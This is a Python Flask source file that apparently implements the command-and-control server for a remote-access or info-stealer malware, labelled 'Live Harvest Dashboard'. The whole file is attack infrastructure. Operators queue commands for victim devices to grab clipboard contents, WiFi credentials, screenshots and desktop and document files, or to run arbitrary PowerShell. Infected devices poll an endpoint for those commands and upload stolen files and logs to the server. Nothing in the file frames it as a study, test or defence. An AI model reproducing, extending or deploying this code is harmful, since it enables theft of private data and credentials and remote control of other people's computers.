from flask import Flask, request, render_template_string, jsonify, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = os.path.abspath('uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
harvest_logs = []
device_commands = {}

@app.route('/', methods=['GET', 'POST'])
def dashboard():
    # Build unique device list (not 'Unknown')
    devices = sorted({entry['device'] for entry in harvest_logs if entry.get('device') and entry['device'] != 'Unknown'})
    # Device selection logic
    selected_device = request.values.get('device', devices[0] if devices else None)

    # Handle command submission (POST)
    if request.method == "POST" and selected_device and not request.path.startswith('/clear'):
        cmd = request.form.get('cmd')
        arg = request.form.get('arg')
        device_commands.setdefault(selected_device, []).append((cmd, arg))
        t = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        harvest_logs.append(dict(time=t, device=selected_device, log=f"Command queued: {cmd} {arg}"))

    # Logs for selected device only
    device_logs = [entry for entry in harvest_logs if entry.get('device') == selected_device]
    # Files for selected device only
    device_files = [fname for fname in os.listdir(UPLOAD_FOLDER) if selected_device and fname.startswith(selected_device)]

    return render_template_string('''
        <h2>Live Harvest Dashboard</h2>
        <form method="post" action="/clear" style="margin-bottom:20px;">
            <button type="submit" style="background:#f22;color:white;padding:6px 16px;border:none;border-radius:4px;">Reset Dashboard (Logs & Files)</button>
        </form>
        <h3>REMOTE CONTROL COMMAND</h3>
        <form method="post">
            <label>Select device:</label>
            <select name="device" onchange="this.form.submit()">
              {% for d in devices %}
                <option value="{{d}}" {% if d == selected_device %}selected{% endif %}>{{d}}</option>
              {% endfor %}
            </select>
            <select name="cmd">
                <option value="clipboard">Extract Clipboard</option>
                <option value="wifi">Extract WiFi</option>
                <option value="screenshot">Screenshot</option>
                <option value="system_info">System Info</option>
                <option value="file">Send File</option>
                <option value="custom">Run Custom PowerShell</option>
                <option value="desktop_deep">Extract Desktop Files</option>
                <option value="documents_deep">Extract Documents Files</option>
                <option value="recent_files">Extract Recent Files</option>
            </select>
            <input type="text" name="arg" placeholder="(Optional file path or command)">
            <button type="submit">Send Command</button>
        </form>
        <table border=1>
          <tr><th>Time</th><th>Device</th><th>Log/Event</th></tr>
          {% for entry in device_logs %}
          <tr>
            <td>{{ entry.time }}</td>
            <td>{{ entry.device }}</td>
            <td>{{ entry.log }}</td>
          </tr>
          {% endfor %}
        </table>
        <h3>Uploaded Files</h3>
        <ul>
        {% for fname in device_files %}
          <li><a href="/uploads/{{fname}}" target="_blank">{{ fname }}</a></li>
        {% endfor %}
        </ul>
    ''', devices=devices, selected_device=selected_device, device_logs=device_logs, device_files=device_files)

@app.route('/clear', methods=['POST'])
def clear_dashboard():
    harvest_logs.clear()
    device_commands.clear()
    # Remove all files in upload folder
    for fname in os.listdir(UPLOAD_FOLDER):
        os.remove(os.path.join(UPLOAD_FOLDER, fname))
    return render_template_string('''
        <h2>Dashboard and uploaded files cleared!</h2>
        <a href="/">Back to dashboard</a>
    ''')

@app.route('/upload', methods=['POST'])
def upload():
    device = request.form.get('device', 'Unknown')
    logmsg = request.form.get('log', '')
    t = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    harvest_logs.append(dict(time=t, device=device, log=logmsg))
    if 'file' in request.files:
        file = request.files['file']
        filename = f"{device}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}"
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        harvest_logs.append(dict(time=t, device=device, log=f"Uploaded file: {filename}"))
    return 'OK'

@app.route('/uploads/<path:filename>')
def files(filename):
    try:
        return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
    except Exception as e:
        print(f"Error serving file {filename}: {e}")   # This prints to Render logs!
        return f"Failed to serve file: {e}", 500

@app.route('/command/<device>', methods=['GET'])
def command(device):
    cmds = device_commands.get(device, [])
    if cmds:
        command = cmds.pop(0)
        return jsonify({'cmd': command[0], 'arg': command[1]})
    else:
        return jsonify({'cmd': 'noop', 'arg': ''})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
